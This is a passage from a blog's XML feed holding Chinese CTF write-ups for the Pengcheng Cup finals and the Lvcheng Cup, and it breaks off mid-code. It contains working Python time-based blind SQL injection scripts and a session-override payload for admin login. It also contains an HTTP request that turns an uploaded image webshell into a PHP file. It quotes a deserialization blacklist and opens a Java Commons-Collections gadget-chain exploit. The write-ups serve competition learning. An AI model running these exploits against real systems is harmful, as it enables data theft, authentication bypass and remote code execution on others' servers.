    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>鹏城杯决赛部分题目</title>
    <link href="/2022/07/24/2022-7-24-%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/"/>
    <url>/2022/07/24/2022-7-24-%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="鹏城杯决赛-wp"><a href="#鹏城杯决赛-wp" class="headerlink" title="鹏城杯决赛 wp"></a>鹏城杯决赛 wp</h1><p>基本没接触到内网，就最后试了试，但msf获取到shell后代理转发还是没成功。内网渗透真就一张白纸，希望今年能多学学。<br>[toc]</p><h2 id="典型企业网络"><a href="#典型企业网络" class="headerlink" title="典型企业网络"></a>典型企业网络</h2><p>两个flag可以直接访问看到<br><a href="http://60.208.18.2/robots.txt">http://60.208.18.2/robots.txt</a> </p><p><a href="http://60.208.18.2:81/flag.txt">http://60.208.18.2:81/flag.txt</a></p><h2 id="摄像头干扰"><a href="#摄像头干扰" class="headerlink" title="摄像头干扰"></a>摄像头干扰</h2><p>tcp.stream eq 30<br>MzIwZjA1Y2RmMDI0OGZmMGQwODZhOGYxYTAyNDk5NTg=</p><h2 id="经典高校网络"><a href="#经典高校网络" class="headerlink" title="经典高校网络"></a>经典高校网络</h2><p>/.git存在git泄露，/Admin.php可以登陆后台，存在测试用户testtest密码为schoolcms，登陆后可以获得一个flag</p><p>时间注入得到数据库的flag</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url0=<span class="hljs-string">&#x27;http://60.209.18.2/index.php&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-built_in">bool</span></span>):</span><br>    url=url0+<span class="hljs-string">f&quot;?m=Admin&amp;c=Article&amp;a=SaveInfo&amp;id[where]=id=3 and if(<span class="hljs-subst">&#123;<span class="hljs-built_in">bool</span>&#125;</span>,sleep(2),0)--+1&quot;</span><br>    tb=time.time()<br>    requests.get(url,cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;ufj7v0cf19tb37bvu0iapjcp60&#x27;</span>&#125;)<br>    ta=time.time()<br>    <span class="hljs-comment"># print(ta-tb)</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> ta-tb&gt;=<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span>():</span><br>    url0=<span class="hljs-string">&#x27;http://127.0.0.1:63342/php/mysql_injection/time_blind.php&#x27;</span><br>    <span class="hljs-comment"># select=&#x27;database()&#x27;</span><br>    <span class="hljs-comment"># schoolcms</span><br>    select=<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;schoolcms&#x27;&quot;</span><br>    <span class="hljs-comment"># flag</span><br>    select=<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;</span><br>    <span class="hljs-comment"># flag</span><br>    select=<span class="hljs-string">&quot;select flag from flag&quot;</span><br>    <span class="hljs-comment"># PCL&#123;d3be4ccd-bf19-41fe-bfe4-8d8db7fd0a1e&#125;</span><br>    result=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        guess=<span class="hljs-number">32</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">bool</span>=<span class="hljs-string">f&#x27;ascii(substr((<span class="hljs-subst">&#123;select&#125;</span>),<span class="hljs-subst">&#123;pos&#125;</span>,1))=<span class="hljs-subst">&#123;guess&#125;</span>&#x27;</span><br>            <span class="hljs-keyword">if</span> test(<span class="hljs-built_in">bool</span>):<br>                <span class="hljs-keyword">break</span><br>            guess+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess==<span class="hljs-number">127</span>:<br>                <span class="hljs-keyword">return</span><br>        result+=<span class="hljs-built_in">chr</span>(guess)<br>        <span class="hljs-built_in">print</span>(result)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    inject()<br>    <span class="hljs-comment"># test(1)</span><br></code></pre></div></td></tr></table></figure><p>上传网站logo处可以上传php木马，路径根据源码可以知道，文件名是以时间命名的，爆破即可，网站根目录有一个flag</p><h2 id="云原生场景"><a href="#云原生场景" class="headerlink" title="云原生场景"></a>云原生场景</h2><p>在action.php存在sql注入，脚本如下，查询<code>select flag from flag</code>即可</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://10.10.1.11:8080/action.php?mode=login&quot;</span><br><br>result = []<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-built_in">bool</span></span>):</span><br>    <span class="hljs-comment"># url=url0+f&quot;?m=Admin&amp;c=Article&amp;a=SaveInfo&amp;id[where]=id=3 and if(&#123;bool&#125;,sleep(1),0)--+1&quot;</span><br>    payload = <span class="hljs-string">f&quot;&amp;pass=p&amp;user=0&#x27;XOR(if(<span class="hljs-subst">&#123;<span class="hljs-built_in">bool</span>&#125;</span>,sleep(0.5),0))XOR&#x27;Z&quot;</span><br>    tb=time.time()<br>    res = requests.post(url,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=9kgvt180gn1t3ji3i8pd7kt4ev&quot;</span>,<br>                                     <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36&quot;</span>,<br>                                     <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;Application/x-www-form-urlencoded&quot;</span>&#125;,data=payload)<br>    <span class="hljs-comment"># print(res.request.headers)</span><br>    <span class="hljs-comment"># print(res.text)</span><br>    ta=time.time()<br>    <span class="hljs-comment"># print(ta-tb)</span><br>    <span class="hljs-keyword">return</span> ta-tb<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span>():</span><br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low + high) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-comment"># select = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;xinxizichan\&#x27;&#x27;</span><br>            <span class="hljs-comment"># select = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>            <span class="hljs-comment"># select = &#x27;select group_concat(password) from zcglxt_ccn.user&#x27;</span><br>            <span class="hljs-comment"># select = &#x27;select group_concat(&quot;id:&quot;,id,&quot;user:&quot;,user,&quot;action:&quot;,action,&quot;ip:&quot;,ip)&#x27;</span><br>            select = <span class="hljs-string">&#x27;select ll from xinxizichan where id =2&#x27;</span><br>            <span class="hljs-comment"># information_schema,mysql,performance_schema,sys,zcglxt_ccn</span><br>            <span class="hljs-comment"># select =&#x27; select group_concat(username) from zcglxt_ccn.config&#x27;</span><br>            <span class="hljs-comment"># admin,test</span><br>            <span class="hljs-comment"># id,user,action,ip,time</span><br><br>            <span class="hljs-comment"># general_log_file: /var/lib/mysql/11279c090274.log   general_log:未指定</span><br><br>            <span class="hljs-comment"># bgszichan,config,danwei,flag,juese,log,system_menu,user,wgbzichan,xinxizichan,zclx,zhuangtai</span><br>            <span class="hljs-comment"># config : id,title,value,sm</span><br>            <span class="hljs-comment"># juese:</span><br>            <span class="hljs-comment"># bgsizichaun:id,zcbh,xlh,zclx,zczt,bm,bgr,dz,cgsj,rzsj,zbsc,sysc,pp,xh,zcly,zcjz,gg,bz,img,ll,</span><br>            <span class="hljs-comment"># danwei:id name status</span><br>            <span class="hljs-comment"># zhuangtai:id,name,status</span><br>            <span class="hljs-comment"># system_menu:id,pid,title,icon,href,target,sort,status,remark,create_at,update_at,delete_at</span><br>            <span class="hljs-built_in">bool</span> = <span class="hljs-string">f&#x27;ascii(substr((<span class="hljs-subst">&#123;select&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>&#x27;</span><br>            cha = test(<span class="hljs-built_in">bool</span>)<br>            <span class="hljs-keyword">if</span> cha &gt; <span class="hljs-number">0.5</span>:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>            mid = (low + high) // <span class="hljs-number">2</span><br><br>        <span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">break</span><br>        name = name + <span class="hljs-built_in">chr</span>(mid)<br>        <span class="hljs-built_in">print</span>(name)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    inject()<br>    <span class="hljs-comment"># test(1)</span><br>    <span class="hljs-comment"># C:\</span><br></code></pre></div></td></tr></table></figure><p>在changepassword处存在extract变量覆盖，post传参覆盖session，从而登陆上admin账户</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">&amp;_SESSION[admin]=admin&amp;_SESSION[juese]=1&amp;_SESSION[user]=admin<br></code></pre></div></td></tr></table></figure><p>在资产目录下可以上传图片马，然后rename函数可以将文件名改为php后缀。但进入if之前需要传入data数据让数据库成功执行update修改数据一次。<br><img src="https://img-blog.csdnimg.cn/0b78674a4aae45d49a74ef6f86f62790.png" alt="在这里插入图片描述"><br>通过查询获取data数据格式<br><img src="https://img-blog.csdnimg.cn/2dd2e08db8a14fedb613c227fb689506.png" alt="在这里插入图片描述"><br>修改img参数的值，发送如下请求，即可将图片马改为php文件</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/action.php?mode=xiugaixxzxzc</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.1.11:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>607<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.1.11:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.1.11:8080/page/editxxzichan.php?id=9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,ko;q=0.8<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=de4b6l8qh31fodhe6jig3qb0sm<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br>id=9&amp;zz=1&amp;data=%7b%22zclx%22%3a%221%22%2c%22zczt%22%3a%221%22%2c%22zcbh%22%3a%22%22%2c%22xlh%22%3a%22ddddssss%22%2c%22bgr%22%3a%22aaa%22%2c%22bm%22%3a%221%22%2c%22dz%22%3a%22dddd%22%2c%22cgsj%22%3a%222022-07-17%22%2c%22rzsj%22%3a%222022-07-17%22%2c%22zbsc%22%3a%220%22%2c%22sysc%22%3a%220%22%2c%22pp%22%3a%22123123%22%2c%22xh%22%3a%22%22%2c%22gg%22%3a%22%22%2c%22zcly%22%3a%22èªè´­%22%2c%22zcjz%22%3a%220.00%22%2c%22bz%22%3a%22%22%2c%22file%22%3a%22%22%2c%22img%22%3a%22%2fuploads%2f1.php%22%2c%22wlbs%22%3a%220%22%2c%22ip%22%3a%22%22%2c%22xsq%22%3a%22%22%2c%22yp%22%3a%220%22%2c%22nc%22%3a%220%22%7d<br></code></pre></div></td></tr></table></figure><p>getshell后在/start.sh文件下发现两个flag<br><img src="https://img-blog.csdnimg.cn/8ed40fd7a15b465493f8ae6e79487909.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绿城杯java</title>
    <link href="/2022/07/23/2022-7-23-%E7%BB%BF%E5%9F%8E%E6%9D%AFjava/"/>
    <url>/2022/07/23/2022-7-23-%E7%BB%BF%E5%9F%8E%E6%9D%AFjava/</url>
    
    <content type="html"><![CDATA[<h1 id="绿城杯java"><a href="#绿城杯java" class="headerlink" title="绿城杯java"></a>绿城杯java</h1><p>去年的比赛有个java题，当时一直没学。</p><p>[toc]</p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>参考<a href="https://ha1c9on.top/?p=1908%E5%92%8Cmrctf%E9%A2%98%E8%A7%A3%EF%BC%8C%E6%9C%89%E5%BE%88%E5%A4%9A%E8%A7%A3%E6%B3%95">https://ha1c9on.top/?p=1908和mrctf题解，有很多解法</a><br>黑名单如下</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;!-- serialkiller.conf --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">config</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">refresh</span>&gt;</span>6000<span class="hljs-tag">&lt;/<span class="hljs-name">refresh</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mode</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- set to false for blocking mode --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">profiling</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">profiling</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mode</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">blacklist</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">regexps</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.apache\.commons\.beanutils\.BeanComparator$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.map\.LazyMap<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>com\.sun\.rowset\.JdbcRowSetImpl$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.rmi\.registry\.Registry$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.rmi\.server\.ObjID$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.rmi\.server\.RemoteObjectInvocationHandler$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.springframework\.beans\.factory\.ObjectFactory$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.AdvisedSupport$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.springframework\.aop\.target\.SingletonTargetSource$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.util\.PriorityQueue$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.lang\.reflect\.Proxy$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>javax\.management\.MBeanServerInvocationHandler$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>javax\.management\.openmbean\.CompositeDataInvocationHandler$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.beans\.EventHandler$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.util\.Comparator$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>org\.reflections\.Reflections$<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">regexps</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">blacklist</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">whitelist</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">regexps</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>.*<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">regexps</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">whitelist</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">config</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>只过滤了下面这些，用3.2新增的DefaultMap替换LazyMap，然后用templates的链子即可</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">- org\<span class="hljs-string">.apache</span>\<span class="hljs-string">.commons</span>\<span class="hljs-string">.collections</span>\<span class="hljs-string">.Transformer</span><br>- org\<span class="hljs-string">.apache</span>\<span class="hljs-string">.commons</span>\<span class="hljs-string">.collections</span>\<span class="hljs-string">.map</span>\<span class="hljs-string">.LazyMap</span><br>- org\<span class="hljs-string">.apache</span>\<span class="hljs-string">.commons</span>\<span class="hljs-string">.collections</span>\<span class="hljs-string">.functors</span>\<span class="hljs-string">.InvokerTransformer</span><br></code></pre></div></td></tr></table></figure><p>mrctf的exp稍微改改map类就行了</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = ClassPool.getDefault().get(HelloTemplatesImpl.class.getName()).toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] bytecode = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;;<br>        HashMap innermap = <span class="hljs-keyword">new</span> HashMap();<br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setField(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,bytecode);<br>        setField(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br>        setField(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        DefaultedMap map = (DefaultedMap)DefaultedMap.decorate(innermap,<span class="hljs-keyword">new</span> FactoryTransformer(<span class="hljs-keyword">new</span> InstantiateFactory(TrAXFilter.class,<span 